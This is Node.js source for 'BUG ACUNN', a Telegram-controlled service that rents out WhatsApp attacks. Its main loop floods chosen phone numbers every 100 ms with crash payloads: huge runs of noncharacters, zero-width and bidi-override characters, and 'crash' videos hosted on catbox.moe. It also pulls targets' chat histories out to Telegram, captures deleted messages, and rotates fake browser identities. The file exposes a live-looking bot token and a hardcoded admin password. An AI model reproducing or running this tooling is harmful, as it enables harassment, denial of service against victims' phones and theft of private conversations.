const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const fs = require('fs');
const crypto = require('crypto');
const QRCode = require('qrcode');
const app = express();
app.use(express.json());
app.use(express.static('public'));

// ========== KONFIGURASI ==========
const BOT_TOKEN = '8929432221:AAG3K8a6THua8Qf33mNEJHpc3iv_7W0tZtc';
const OWNER_ID = '8718615350';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ========== DATA USER ==========
const DATA_FILE = './users.json';
const SESSIONS_FILE = './sessions.json';
let users = {};
let sessions = {};

function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE);
            users = JSON.parse(raw);
        } else {
            users = {};
        }
    } catch (e) {
        users = {};
    }
}
function saveUsers() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
    } catch (e) {}
}

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const raw = fs.readFileSync(SESSIONS_FILE);
            sessions = JSON.parse(raw);
        } else {
            sessions = {};
        }
    } catch (e) {
        sessions = {};
    }
}
function saveSessions() {
    try {
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
    } catch (e) {}
}

loadUsers();
loadSessions();

// ========== HARCODE ADMIN ACUNN ==========
users['Acunn'] = {
    password: 'Kontol980',
    role: 'admin',
    expired: null,
    targets: { admin: [], users: [] },
    sock: null,
    qr: null,
    spamInterval: null,
    totalSpam: 0,
    telegramId: null,
    attackType: 'cyclone'
};
saveUsers();

function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

function isExpired(user) {
    if (user.role === 'admin') return false;
    if (!user.expired) return true;
    const now = new Date();
    const exp = new Date(user.expired);
    return now > exp;
}

// ========== TELEGRAM BOT ==========
bot.onText(/\/adduser (.+) (.+) (.+) (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
    const username = match[1], password = match[2], role = match[3].toLowerCase(), expired = match[4];
    if (users[username]) return bot.sendMessage(msg.chat.id, `⚠️ User ${username} sudah ada.`);
    if (!['admin', 'user'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau user.');
    const exp = role === 'admin' ? null : expired;
    users[username] = {
        password,
        role,
        expired: exp,
        targets: { admin: [], users: [] },
        sock: null,
        qr: null,
        spamInterval: null,
        totalSpam: 0,
        telegramId: null,
        attackType: 'cyclone'
    };
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ User ${username} (${role}) ditambahkan, expired ${exp || 'TIDAK ADA (admin)'}`);
});

bot.onText(/\/deluser (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
    const username = match[1];
    if (!users[username]) return bot.sendMessage(msg.chat.id, `❌ User ${username} tidak ditemukan.`);
    if (username === 'Acunn') return bot.sendMessage(msg.chat.id, '❌ Gak bisa hapus admin utama!');
    delete users[username];
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ User ${username} dihapus.`);
});

bot.onText(/\/setexpired (.+) (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner!');
    const username = match[1], expired = match[2];
    if (!users[username]) return bot.sendMessage(msg.chat.id, `❌ User ${username} tidak ditemukan.`);
    if (users[username].role === 'admin') return bot.sendMessage(msg.chat.id, '❌ Admin gak bisa expired!');
    users[username].expired = expired;
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ User ${username} expired diubah jadi ${expired}`);
});

bot.onText(/\/login (.+) (.+)/, (msg, match) => {
    const username = match[1], password = match[2];
    if (!users[username] || users[username].password !== password)
        return bot.sendMessage(msg.chat.id, '❌ Username atau password salah!');
    if (isExpired(users[username]))
        return bot.sendMessage(msg.chat.id, '❌ User expired!');
    users[username].telegramId = msg.chat.id.toString();
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ Login berhasil!`);
});

function getUsernameFromChat(chatId) {
    for (let u in users) {
        if (users[u].telegramId === chatId.toString()) return u;
    }
    return null;
}

function isUserAuthorized(username) {
    if (!username) return false;
    if (isExpired(users[username])) return false;
    return true;
}

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `☠️ BUG ACUNN ACTIVATED ☠️\nGunakan /help buat lihat perintah.`);
});
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, `
🔥 PERINTAH BUG ACUNN 🔥
/login [username] [password] – login
/addtarget [nomor] [role] – tambah target
/removetarget [nomor] – hapus target
/startspam – mulai spam
/stopspam – hentikan spam
/status – lihat status
/qr – dapatkan QR code (GAMBAR)
/pair [nomor] – dapatkan kode pairing 8 digit
/setattack [mode] – ganti mode serangan
/extract [nomor] – ekstrak chat target
/rotate – rotasi session
[OWNER ONLY]
/adduser [user] [pass] [role] [expired]
/deluser [user]
/setexpired [user] [YYYY-MM-DD]
`);
});

bot.onText(/\/startspam/, async (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
    await startWASession(username);
    bot.sendMessage(msg.chat.id, '🚀 Spam dimulai!');
});

bot.onText(/\/stopspam/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    stopSpamForUser(username);
    bot.sendMessage(msg.chat.id, '⛔ Spam dihentikan.');
});

bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const number = match[1], role = match[2].toLowerCase();
    if (!['admin', 'users'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
    users[username].targets[role].push(number);
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ ${role} ${number} ditambahkan!`);
    updateSpamForUser(username);
});

bot.onText(/\/removetarget (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const number = match[1];
    let removed = false;
    ['admin', 'users'].forEach(role => {
        const idx = users[username].targets[role].indexOf(number);
        if (idx !== -1) { users[username].targets[role].splice(idx, 1); removed = true; }
    });
    if (removed) { saveUsers(); bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); }
    else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
});

bot.onText(/\/status/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const user = users[username];
    const admin = user.targets.admin.join(', ') || 'kosong';
    const usersList = user.targets.users.join(', ') || 'kosong';
    bot.sendMessage(msg.chat.id, `
📊 USER: ${username} (${user.role})
👑 Admin: ${admin}
👤 User: ${usersList}
📨 Total spam: ${user.totalSpam || 0}
🔗 Koneksi WA: ${user.sock ? '✅ Online' : '❌ Offline'}
🎯 Attack: ${user.attackType || 'cyclone'}
⏳ Expired: ${user.expired || 'TIDAK ADA (admin)'}
`);
});

// ===== QR GAMBAR VIA TELEGRAM =====
bot.onText(/\/qr/, async (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) {
        return bot.sendMessage(msg.chat.id, '❌ Login dulu!');
    }
    const user = users[username];
    if (!user.qr) {
        return bot.sendMessage(msg.chat.id, '❌ Belum ada QR. Kirim /startspam dulu.');
    }
    try {
        const qrBuffer = await QRCode.toBuffer(user.qr, { type: 'png', margin: 2 });
        await bot.sendPhoto(msg.chat.id, qrBuffer, { caption: '📱 Scan QR ini di WhatsApp' });
    } catch (e) {
        bot.sendMessage(msg.chat.id, '❌ Gagal generate QR: ' + e.message);
    }
});

// ===== PAIRING KODE 8 DIGIT =====
bot.onText(/\/pair (.+)/, async (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) {
        return bot.sendMessage(msg.chat.id, '❌ Login dulu!');
    }
    const phone = match[1];
    if (!phone || phone.length < 10) {
        return bot.sendMessage(msg.chat.id, '❌ Nomor tidak valid. Format: 628xxx');
    }
    try {
        const code = await pairWASession(username, phone);
        bot.sendMessage(msg.chat.id, `✅ KODE PAIRING: ${code}\nMasukkan di WhatsApp dalam 5 menit.`);
    } catch (e) {
        bot.sendMessage(msg.chat.id, '❌ Gagal pairing: ' + e.message);
    }
});

bot.onText(/\/setattack (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const type = match[1];
    const validTypes = ['crash_ui','delay_invisible','crash_ios_invisible','force_close_1msg','force_close_invisible','force_close_ios_invisible','spam_call','delay_hard_invisible','blank_andro','force_close_infinity','video_exploit','cyclone'];
    if (!validTypes.includes(type)) return bot.sendMessage(msg.chat.id, '❌ Mode tidak valid.');
    users[username].attackType = type;
    saveUsers();
    updateSpamForUser(username);
    bot.sendMessage(msg.chat.id, `✅ Serangan diubah ke ${type}`);
});

// ========== ANTI-REVOKE ==========
function setupAntiRevoke(sock, username) {
    sock.ev.on('messages.update', async (update) => {
        for (const msg of update) {
            if (msg.update.status === 'revoked') {
                const original = msg.original;
                const sender = original.key.remoteJid;
                const text = original.message?.conversation || original.message?.extendedTextMessage?.text || '[Media]';
                console.log(`[REVOKED] ${sender}: ${text}`);
                if (users[username]?.telegramId) {
                    bot.sendMessage(users[username].telegramId, `🔒 Pesan dihapus:\nDari: ${sender}\nIsi: ${text}`);
                }
            }
        }
    });
}

// ========== WA ENGINE ==========
async function startWASession(username) {
    const user = users[username];
    if (user.sock) { updateSpamForUser(username); return; }
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: ['BugAcunn', 'Chrome', '120.0.0.0']
    });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            user.qr = qr;
            if (user.telegramId) bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
        }
        if (connection === 'open') {
            user.sock = sock;
            user.qr = null;
            console.log(`✅ ${username} connected`);
            setupAntiRevoke(sock, username);
            updateSpamForUser(username);
            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason === DisconnectReason.loggedOut || reason === 401) {
                user.sock = null;
                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session putus! Reconnect...');
                setTimeout(async () => { await startWASession(username); }, 5000);
            }
        }
    });
    user.sock = sock;
    saveUsers();
}

async function pairWASession(username, phoneNumber) {
    const user = users[username];
    if (user.sock) { try { await user.sock.end(); } catch(e) {} user.sock = null; }
    const sessionPath = `./sessions/${username}`;
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
    }
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        browser: ['BugAcunn', 'Chrome', '120.0.0.0']
    });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            user.qr = qr;
            if (user.telegramId) {
                bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
            }
        }
        if (connection === 'open') {
            user.sock = sock;
            user.qr = null;
            console.log(`✅ ${username} connected via pairing`);
            setupAntiRevoke(sock, username);
            updateSpamForUser(username);
            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason === DisconnectReason.loggedOut || reason === 401) {
                user.sock = null;
                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout. Ulangi pairing.');
            }
        }
    });
    user.sock = sock;
    saveUsers();
    const code = await sock.requestPairingCode(phoneNumber);
    return code;
}

function updateSpamForUser(username) {
    const user = users[username];
    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
    if (!user.sock) return;
    const allTargets = [...user.targets.admin, ...user.targets.users];
    if (allTargets.length === 0) return;
    const attackType = user.attackType || 'cyclone';
    user.spamInterval = setInterval(async () => {
        try {
            for (let target of allTargets) {
                switch (attackType) {
                    case 'crash_ui':
                        await user.sock.sendMessage(target, { text: '💥 CRASH UI' });
                        await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                        await user.sock.sendMessage(target, { text: 'A'.repeat(20000) });
                        break;
                    case 'delay_invisible':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) });
                        await user.sock.sendMessage(target, { text: '\u2060\u2060\u2060'.repeat(5000) });
                        break;
                    case 'crash_ios_invisible':
                        await user.sock.sendMessage(target, { text: '\u202E\u202D\u2066'.repeat(3000) });
                        await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(500) });
                        break;
                    case 'force_close_1msg':
                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE' });
                        await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                        await user.sock.sendMessage(target, { text: 'BOMB'.repeat(5000) });
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                        break;
                    case 'force_close_invisible':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(5000) + '\uFFFE'.repeat(300) });
                        break;
                    case 'force_close_ios_invisible':
                        await user.sock.sendMessage(target, { text: '\u202E'.repeat(5000) + '\uFFFE'.repeat(500) });
                        break;
                    case 'spam_call':
                        await user.sock.sendMessage(target, { text: '📞 INCOMING CALL...' });
                        await user.sock.sendMessage(target, { text: '📞 MISSED CALL' });
                        break;
                    case 'delay_hard_invisible':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(20000) });
                        await user.sock.sendMessage(target, { text: '\u2060'.repeat(10000) });
                        break;
                    case 'blank_andro':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) });
                        break;
                    case 'force_close_infinity':
                        for (let i = 0; i < 10; i++) {
                            await user.sock.sendMessage(target, { text: '♾️ LOOP ' + i });
                            await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(200) });
                        }
                        break;
                    case 'video_exploit':
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid2.mp4' } });
                        break;
                    case 'cyclone':
                        await user.sock.sendMessage(target, { text: '☠️ CYCLONE ACTIVE' });
                        await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                        await user.sock.sendMessage(target, { text: '\u202E\u202D'.repeat(500) });
                        await user.sock.sendMessage(target, { text: 'BOMB'.repeat(5000) });
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) });
                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE' });
                        break;
                    default:
                        await user.sock.sendMessage(target, { text: '☠️ BUG ACUNN' });
                }
                user.totalSpam = (user.totalSpam || 0) + 1;
            }
        } catch (e) {}
        saveUsers();
    }, 100);
}

function stopSpamForUser(username) {
    const user = users[username];
    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
}

// ========== REST API ==========
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
    if (!users[username] || users[username].password !== password)
        return res.status(401).json({ error: 'Username atau password salah' });
    if (isExpired(users[username]))
        return res.status(401).json({ error: 'User expired!' });
    const token = generateToken();
    sessions[token] = username;
    saveSessions();
    res.json({ token, username, role: users[username].role });
});

function auth(req, res, next) {
    const token = req.headers['x-token'] || req.query.token;
    loadSessions();
    if (!token || !sessions[token]) {
        return res.status(401).json({ error: 'Unauthorized - Silakan login ulang' });
    }
    const username = sessions[token];
    if (isExpired(users[username])) {
        delete sessions[token];
        saveSessions();
        return res.status(401).json({ error: 'User expired! Login ulang.' });
    }
    req.username = username;
    next();
}

// ========== REST API ==========
app.get('/api/status', auth, (req, res) => {
    const user = users[req.username];
    res.json({
        targets: user.targets,
        totalSpam: user.totalSpam || 0,
        connected: !!user.sock,
        attackType: user.attackType || 'cyclone'
    });
});

app.post('/api/start', auth, async (req, res) => {
    await startWASession(req.username);
    res.json({ message: 'Session started' });
});

app.post('/api/stop', auth, (req, res) => {
    stopSpamForUser(req.username);
    res.json({ message: 'Spam stopped' });
});

app.post('/api/targets', auth, (req, res) => {
    const { number, role } = req.body;
    if (!number || !role) return res.status(400).json({ error: 'Missing fields' });
    const user = users[req.username];
    if (!['admin', 'users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
    user.targets[role].push(number);
    saveUsers();
    updateSpamForUser(req.username);
    res.json({ success: true });
});

app.delete('/api/targets', auth, (req, res) => {
    const { number, role } = req.body;
    const user = users[req.username];
    if (!['admin', 'users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
    const idx = user.targets[role].indexOf(number);
    if (idx !== -1) {
        user.targets[role].splice(idx, 1);
        saveUsers();
        updateSpamForUser(req.username);
    }
    res.json({ success: true });
});

// ===== QR ENDPOINT (GAMBAR) =====
app.get('/api/qr', auth, async (req, res) => {
    const user = users[req.username];
    if (!user.qr) return res.json({ qr: null });
    try {
        const qrImage = await QRCode.toDataURL(user.qr);
        res.json({ qr: qrImage });
    } catch (err) {
        res.status(500).json({ error: 'Gagal generate QR' });
    }
});

// ===== PAIRING ENDPOINT =====
app.post('/api/pair', auth, async (req, res) => {
    const { phone } = req.body;
    if (!phone || phone.length < 10) return res.status(400).json({ error: 'Nomor tidak valid' });
    try {
        const code = await pairWASession(req.username, phone);
        res.json({ code });
    } catch (e) {
        console.error('Pairing error:', e);
        res.status(500).json({ error: 'Gagal pairing: ' + e.message });
    }
});

app.post('/api/setattack', auth, (req, res) => {
    const { type } = req.body;
    const validTypes = ['crash_ui','delay_invisible','crash_ios_invisible','force_close_1msg','force_close_invisible','force_close_ios_invisible','spam_call','delay_hard_invisible','blank_andro','force_close_infinity','video_exploit','cyclone'];
    if (!validTypes.includes(type)) return res.status(400).json({ error: 'Tipe serangan tidak valid' });
    users[req.username].attackType = type;
    saveUsers();
    updateSpamForUser(req.username);
    res.json({ success: true });
});

// ===== EXTRACT DB =====
app.post('/api/extract', auth, async (req, res) => {
    const { target } = req.body;
    if (!target) return res.status(400).json({ error: 'Target nomor wajib' });
    const user = users[req.username];
    if (!user.sock) return res.status(400).json({ error: 'WA belum konek' });
    try {
        const messages = await user.sock.loadMessages(target, 500);
        const chats = messages.map(m => ({
            from: m.key.remoteJid,
            text: m.message?.conversation || m.message?.extendedTextMessage?.text || '[Media]',
            timestamp: m.messageTimestamp
        }));
        const filePath = `./extracts/${target}_${Date.now()}.json`;
        if (!fs.existsSync('./extracts')) fs.mkdirSync('./extracts');
        fs.writeFileSync(filePath, JSON.stringify(chats, null, 2));
        if (users[req.username]?.telegramId) {
            await bot.sendDocument(users[req.username].telegramId, filePath, { caption: `📊 Chat log ${target}` });
        }
        res.json({ success: true, count: chats.length, file: filePath });
    } catch (e) {
        res.status(500).json({ error: 'Gagal ekstrak: ' + e.message });
    }
});

// ===== ROTATE SESSION =====
app.post('/api/rotatesession', auth, async (req, res) => {
    const user = users[req.username];
    if (!user.sock) return res.status(400).json({ error: 'WA belum konek' });
    try {
        await user.sock.end();
        user.sock = null;
        stopSpamForUser(req.username);
        const browsers = ['Chrome','Firefox','Edge','Safari','Opera'];
        const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${req.username}`);
        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            browser: ['BugAcunn', randomBrowser, '120.0.0.0']
        });
        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', (update) => {
            if (update.connection === 'open') {
                user.sock = sock;
                user.qr = null;
                console.log(`✅ Session rotated for ${req.username}`);
                if (user.telegramId) {
                    bot.sendMessage(user.telegramId, '🔄 Session di-rotate! Browser: ' + randomBrowser);
                }
                updateSpamForUser(req.username);
            }
            if (update.connection === 'close') {
                const reason = update.lastDisconnect?.error?.output?.statusCode;
                if (reason === DisconnectReason.loggedOut || reason === 401) {
                    user.sock = null;
                    if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout saat rotate.');
                }
            }
        });
        user.sock = sock;
        saveUsers();
        res.json({ success: true, message: 'Session di-rotate, browser: ' + randomBrowser });
    } catch (e) {
        res.status(500).json({ error: 'Gagal rotate: ' + e.message });
    }
});

// ========== ADMIN API ==========
app.get('/api/admin/users', auth, (req, res) => {
    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const list = Object.keys(users).map(u => ({
        username: u,
        role: users[u].role,
        expired: users[u].expired || 'TIDAK ADA (admin)',
        totalSpam: users[u].totalSpam || 0,
        connected: !!users[u].sock,
        targetCount: users[u].targets.admin.length + users[u].targets.users.length
    }));
    res.json(list);
});

app.post('/api/admin/adduser', auth, (req, res) => {
    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const { username, password, role, expired } = req.body;
    if (!username || !password || !role) return res.status(400).json({ error: 'Username, password, role wajib' });
    if (users[username]) return res.status(400).json({ error: 'User sudah ada' });
    if (!['admin', 'user'].includes(role)) return res.status(400).json({ error: 'Role harus admin atau user' });
    const exp = role === 'admin' ? null : expired;
    users[username] = {
        password,
        role,
        expired: exp,
        targets: { admin: [], users: [] },
        sock: null,
        qr: null,
        spamInterval: null,
        totalSpam: 0,
        telegramId: null,
        attackType: 'cyclone'
    };
    saveUsers();
    res.json({ success: true, message: `User ${username} (${role}) ditambahkan, expired ${exp || 'TIDAK ADA (admin)'}` });
});

app.delete('/api/admin/deluser', auth, (req, res) => {
    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const { username } = req.body;
    if (!users[username]) return res.status(400).json({ error: 'User tidak ditemukan' });
    if (username === 'Acunn') return res.status(400).json({ error: 'Gak bisa hapus admin utama!' });
    delete users[username];
    saveUsers();
    res.json({ success: true, message: `User ${username} dihapus` });
});

app.post('/api/admin/setexpired', auth, (req, res) => {
    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const { username, expired } = req.body;
    if (!users[username]) return res.status(400).json({ error: 'User tidak ditemukan' });
    if (users[username].role === 'admin') return res.status(400).json({ error: 'Admin gak bisa expired!' });
    users[username].expired = expired;
    saveUsers();
    res.json({ success: true, message: `User ${username} expired diubah jadi ${expired}` });
});

// ========== JALANKAN SERVER ==========
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Bot Telegram aktif`);
});
